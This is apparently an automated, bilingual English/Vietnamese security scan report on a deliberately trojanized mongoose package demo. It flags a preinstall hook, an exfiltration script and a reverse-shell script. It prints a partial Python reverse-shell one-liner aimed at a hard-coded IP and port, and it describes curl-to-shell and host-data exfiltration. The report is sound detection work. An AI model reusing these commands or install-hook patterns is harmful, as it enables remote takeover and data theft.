====================================================================================================
VERIFICATION REPORT - STATIC vs DYNAMIC ANALYSIS COMPARISON
BÁO CÁO XÁC MINH - SO SÁNH PHÂN TÍCH TĨNH VÀ ĐỘNG
====================================================================================================

Generated: 2025-11-27 23:47:43
Repository: ../mongoose
Version: v8.19.4-malware-demo

====================================================================================================
VERIFICATION SUMMARY / TÓNG KẾT XÁC MINH
====================================================================================================

✅ CONFIRMED Findings (Xác nhận): 1
   - Both static analysis and dynamic runtime behavior agree
   - High confidence security issues

⚠️  SUSPICIOUS Static-Only (Nghi ngờ - chỉ tĩnh): 26
   - Detected in code but not observed at runtime
   - May be false positives or conditional vulnerabilities

⚠️  SUSPICIOUS Dynamic-Only (Nghi ngờ - chỉ động): 2
   - Observed at runtime but not predicted by static analysis
   - May indicate sophisticated evasion or analysis gaps

====================================================================================================
LLM SECURITY ANALYSIS / PHÂN TÍCH BẢO MẬT
====================================================================================================
LLM analysis unavailable.

====================================================================================================
DETAILED VERIFIED FINDINGS / CHI TIẾT CÁC PHÁT HIỆN ĐÃ XÁC MINH
====================================================================================================

[1] ✅ CONFIRMED - HIGH
Category: Suspicious Network Access

STATIC ANALYSIS:
  File: main_reverse_shell.sh:7
  Description: The reverse shell connects to a hard-coded external IP address (77.244.210.247) across many ports. Hard-coded C2 endpoints in code are strong indicators of backdoor/malicious behavior.

DYNAMIC RUNTIME:
  Process: python3
  Connection: 77.244.210.247:22857
  Command: python3 -c import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect(("77.244.210.247",22857)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); p=

RECOMMENDATION:
  Block the IP at network level and investigate any connections to it. Remove hard-coded remote hosts from repository. Treat any machine that contacted that IP as compromised.
================================================================================

====================================================================================================
SUSPICIOUS STATIC-ONLY FINDINGS / PHÁT HIỆN NGHI NGỜ (CHỈ TĨNH)
====================================================================================================

[1] ⚠️  HIGH - supply_chain_tampering
  File: package.json:4
  The package version was changed to include the string "-malware-demo". This is a strong indicator that the package metadata (and possibly the package contents for that release) has been tampered with to denote a malicious or demo-malware release. A trojanized or maliciously labeled release of a popu


[2] ⚠️  MEDIUM - metadata_tampering
  File: package.json:5
  The commit author (JakeClark) differs from the package author field (Guillermo Rauch). While not definitive proof of malicious intent, this mismatch combined with the suspicious version label indicates possible unauthorized modification of package metadata.


[3] ⚠️  LOW - versioning_policy
  File: package.json:4
  The version string includes a non-standard suffix containing a human-readable label. Non-semver or unusual pre-release tags can cause unexpected resolution behavior in dependency managers and may be used to bypass simple automated filters that look for numeric version patterns.


[4] ⚠️  CRITICAL - Command Execution
  File: package.json:77
  A preinstall script was added that runs a local Node script and then a shell script. This causes arbitrary code (malware_exfil.js and main_reverse_shell.sh) to execute automatically during npm install, enabling supply-chain compromise and remote code execution on any machine that installs the packag


[5] ⚠️  CRITICAL - Suspicious Network Access
  File: malware_exfil.js:24
  The script performs an outbound HTTPS POST to an external, likely attacker-controlled domain (oastify.com) sending sensitive system/package data. This is clear data exfiltration to an external service.


[6] ⚠️  CRITICAL - Data Leaks
  File: malware_exfil.js:11
  The script collects and transmits sensitive host/package data including home directory, hostname, username, DNS servers, and the full package.json contents. This exposes credentials, secrets, and identifying information.


[7] ⚠️  CRITICAL - Command Execution
  File: main_reverse_shell.sh:7
  This script attempts to establish reverse shells using multiple interpreters and utilities (python, perl, nc, sh), connecting to a remote IP across a wide port range. If executed, it will provide remote interactive shell access to the attacker-controlled host, giving full system compromise.


[8] ⚠️  CRITICAL - Code Injection
  File: main_reverse_shell.sh:3
  The file contains instructions and code that recommend piping remote content into a shell (curl ... | sh). This pattern is remote code execution by design and extremely dangerous.


[9] ⚠️  HIGH - Unsafe Environment Variables
  File: malware_exfil.js:1
  The script executes during package lifecycle and reads local environment/host details (home directory, username, hostname). While not reading process.env directly, running this in an install context can expose environment-sensitive data and potentially secrets located in the home directory or config


[10] ⚠️  HIGH - suspicious_network_access
  File: docs/nextjs.md:24
  The code calls mongoose.connect(MONGODB_URI) using a URI taken from the environment. If an attacker can influence MONGODB_URI (for example via a misconfigured environment in CI/CD, container injection, or a compromised host), they can point the application at an attacker-controlled MongoDB instance 


[11] ⚠️  MEDIUM - unsafe_environment_variables
  File: docs/nextjs.md:6
  The code reads process.env.MONGODB_URI directly from a docs file code block. While reading env vars is normal, environment variables often contain sensitive credentials. If this documentation snippet is copied into runtime code or if environment variables are accidentally logged or exposed, secrets 


[12] ⚠️  MEDIUM - suspicious_network_access
  File: docs/nextjs.md:20
  The previous implementation avoided creating a new connection when mongoose.connection.readyState >= 1. That guard was removed in this refactor. Always calling mongoose.connect without checking the existing connection state can lead to repeated connections (resource exhaustion) or unexpected reconne


[13] ⚠️  HIGH - data_leaks
  File: docs/nextjs.md:150
  The documentation shows returning complete Mongoose documents (converted via JSON.parse(JSON.stringify(users))) as page props and sending them to the client. If the User model contains sensitive fields (password hashes, tokens, PII), those fields will be serialized and sent to the browser, causing s


[14] ⚠️  MEDIUM - suspicious_network_access
  File: docs/nextjs.md:24
  The simplified dbConnect() removed the previous shared 'promise' caching pattern. With the new implementation, concurrent requests when no connection exists may each call mongoose.connect(), potentially creating multiple simultaneous connection attempts to the database. This can lead to connection s


[15] ⚠️  MEDIUM - unsafe_environment_variables
  File: docs/nextjs.md:5
  The docs rely on MONGODB_URI environment variable to connect to the database. Connection URIs commonly contain embedded credentials. Documentation and example code must avoid printing, logging, or committing actual URIs or credentials, and should advise secure storage and restricted access.


[16] ⚠️  LOW - data_leaks
  File: docs/nextjs.md:134
  The docs removed the .lean() call and now recommend JSON.parse(JSON.stringify(users)) for serialization. While this converts documents to plain objects, it can be inefficient and may inadvertently serialize non-enumerable or large nested structures, increasing memory usage and possibly causing large


[17] ⚠️  HIGH - data_leaks
  File: docs/nextjs.md:12
  The examples return entire user documents directly to clients (e.g., res.status(200).json({ users }) and Response.json({ users })) which may include sensitive fields such as hashed passwords, API tokens, or other PII. Returning raw documents increases the risk of accidental exposure of sensitive dat


[18] ⚠️  MEDIUM - code_injection
  File: docs/nextjs.md:58
  The example uses User.create(req.body) in an API route without validating or sanitizing req.body. Accepting and saving unvalidated client input into the database can lead to unwanted data being stored, logical injection of query operators (MongoDB query selector injection), or persistence of malicio


[19] ⚠️  HIGH - unsafe_environment_variables
  File: docs/nextjs.md:8
  The code reads the database connection string from process.env.MONGODB_URI. If this environment variable is accidentally exposed to client bundles (for example by using NEXT_PUBLIC_ prefix or importing server-only modules into client components), the database credentials could be leaked. The docs al


[20] ⚠️  MEDIUM - data_leaks
  File: docs/nextjs.md:18
  The Quick Start example serializes DB results for getServerSideProps using JSON.parse(JSON.stringify(users)). This pattern can inadvertently include fields that should not be sent to the client (e.g., internal metadata). It also does not protect against large payloads or nested sensitive fields that


[21] ⚠️  LOW - suspicious_network_access
  File: docs/nextjs.md:1
  Documentation contains multiple external links to third-party resources (nextjs.org, mongoosejs.com, github.com, vercel.com). While these links are legitimate references, their presence is flagged as external network references which could be a vector for phishing if a malicious link were introduced


[22] ⚠️  MEDIUM - suspicious_network_access
  File: docs/schematypes.md:48
  The documentation contains an explicit HTTP link to an external plugin search site. Using plain HTTP (instead of HTTPS) in documentation can lead readers to an insecure endpoint that is vulnerable to man-in-the-middle (MITM) attacks or DNS spoofing. Linking to an insecure external resource from offi


[23] ⚠️  MEDIUM - code_injection
  File: docs/schematypes.md:69
  The new Union SchemaType documentation demonstrates that values (including user input) are automatically cast to the first successful type in the union and that Mongoose will cast query filters and updates according to the union types. Automatic coercion in queries can lead to unexpected query behav


[24] ⚠️  LOW - suspicious_network_access
  File: docs/faq.md:414
  The documentation includes an external hyperlink to masteringjs.io. While linking to third-party resources in docs is common and usually harmless, external links can redirect users to untrusted content, enable tracking, or be abused for social engineering/phishing. The reported suspicious pattern in


[25] ⚠️  MEDIUM - data_leaks
  File: lib/schema.js:1698
  Mutation of a potentially shared 'cast' object by assigning a reference to the parent schema (cast.parentSchema = this). If 'cast' is a shared type descriptor or reused object across schemas/models, this introduces stateful cross-object coupling that can lead to accidental information leakage, unexp


[26] ⚠️  LOW - suspicious_network_access
  File: lib/schema.js:1695
  The code emits an error message that contains a shortened URL (https://bit.ly/mongoose-schematypes). Short URLs can obscure the real destination and are sometimes used in social engineering or to avoid automated filters. While this is only a message string (no network request is made by the code its


====================================================================================================
SUSPICIOUS DYNAMIC-ONLY FINDINGS / PHÁT HIỆN NGHI NGỜ (CHỈ ĐỘNG)
====================================================================================================

[1] ⚠️  CRITICAL - data_exfiltration
  Process: node
  Network: 54.77.139.23:0
  Command: node malware_exfil.js


[2] ⚠️  CRITICAL - data_exfiltration
  Process: node
  Network: 3.248.33.252:0
  Command: node malware_exfil.js

====================================================================================================
END OF VERIFICATION REPORT
====================================================================================================